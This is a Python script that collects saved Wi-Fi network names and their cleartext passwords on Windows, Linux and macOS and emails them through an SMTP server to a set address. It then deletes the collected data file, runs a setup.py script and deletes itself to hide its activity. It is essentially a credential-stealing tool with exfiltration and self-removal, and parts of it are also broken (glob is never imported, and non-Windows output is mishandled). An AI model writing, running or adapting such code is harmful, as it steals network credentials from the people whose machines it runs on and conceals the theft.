import os
import smtplib
import subprocess
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import csv

def extract_wifi_info_windows():
    try:
        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)

        # Check if the command was successful
        if result.returncode == 0:
            # Extract Wi-Fi profile names
            profiles = [line.split(":")[1].strip() for line in result.stdout.split("\n") if "All User Profile" in line]
            
            # Create a list to hold the Wi-Fi network names and keys
            wifi_data = []
            
            # Collect the Wi-Fi network names and keys
            for profile in profiles:
                # Run the command to get the key for each profile
                key_result = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True)
                if key_result.returncode == 0:
                    # Extract the key from the output if available
                    key_lines = [line.split(":")[1].strip() for line in key_result.stdout.split("\n") if "Key Content" in line]
                    key = key_lines[0] if key_lines else "No Key Found"
                    wifi_data.append([profile, key])
                else:
                    wifi_data.append([profile, "Failed to fetch key"])
            
            # Write the Wi-Fi network names and keys into a text file
            with open("wifi_networks.txt", "w") as file:
                writer = csv.writer(file, delimiter='\t')
                writer.writerow(["Network Name", "Key"])
                writer.writerows(wifi_data)

            print("Data has been written to wifi_networks.txt file.")
        else:
            print("Failed to fetch Wi-Fi network names.")
        return wifi_data
    except Exception as e:
        print("Error extracting WiFi info on Windows:", e)
        return []

def extract_wifi_info_linux():
    try:
        output = ""
        for file in glob.glob("/etc/NetworkManager/system-connections/*"):
            output += subprocess.check_output("cat " + file, shell=True).decode("utf-8")
            output += "\n===========================\n"
        return output
    except Exception as e:
        print("Error extracting WiFi info on Linux:", e)
        return ""

def extract_wifi_info_macos():
    try:
        output = subprocess.check_output(["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-s"])
        return output.decode("utf-8")
    except Exception as e:
        print("Error extracting WiFi info on macOS:", e)
        return ""

def send_email(sender, receiver, subject, message, username, password):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = subject
        msg.attach(MIMEText(message, 'plain'))

        with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
            server.login(username, password)
            server.sendmail(sender, receiver, msg.as_string())
        print("Email sent successfully!")
    except Exception as e:
        print("Error sending email:", e)

def remove_temp_file(file_path):
    try:
        os.remove(file_path)
        print("Temporary file removed.")
    except Exception as e:
        print("Error removing temporary file:", e)

def sign_setup_script():
    try:
        # Use GPG to sign the setup script
        subprocess.run(["gpg", "--detach-sign", "setup.py"])
        print("Setup script signed successfully.")
    except Exception as e:
        print("Error signing setup script:", e)

def encrypt_information_file():
    try:
        # Use the Encrypt-Decrypt.py script to encrypt the Informations.txt file
        subprocess.run(["python", "Encrypt-Decrypt.py", "--encrypt", "Informations.txt"])
        print("Informations.txt encrypted successfully.")
    except Exception as e:
        print("Error encrypting Informations.txt:", e)

def main():
    system_information = "Informations.txt"
    sender = "example@gmail.com"
    receiver = "example@gmail.com"
    subject = "alsowadi has sent you a message"

    if os.name == "nt":
        wifi_data = extract_wifi_info_windows()
    elif os.name == "posix":
        if os.uname().sysname == "Darwin":
            wifi_data = extract_wifi_info_macos()
        else:
            wifi_data = extract_wifi_info_linux()

    # Append WiFi data to Informations.txt
    with open("Informations.txt", "a") as file:
        file.write("WiFi Networks Information:\n")
        for network in wifi_data:
            file.write(f"Network Name: {network[0]}, Key: {network[1]}\n")

    # Read the contents of Informations.txt
    with open("Informations.txt", "r") as file:
        message = file.read()

    send_email(sender, receiver, subject, message, YOUR_USERNAME, YOUR_PASSWORD)
    remove_temp_file(system_information)
    
    # Delete the script file
   

    # Execute the setup script
    try:
        subprocess.run(["python", "setup.py"])
        print("Setup script executed successfully.")
    except Exception as e:
        print("Error executing setup script:", e)
    # Delete the script file
    try:
        os.remove(__file__)
        print("Script file deleted.")
    except Exception as e:
        print("Error deleting script file:", e)
    # try:
    #     os.remove(__file__)
    #     print("Script file deleted.")
    # except Exception as e:
    #     print("Error deleting script file:", e)

if __name__ == "__main__":
    YOUR_USERNAME = "username"
    YOUR_PASSWORD = "password"
    main()


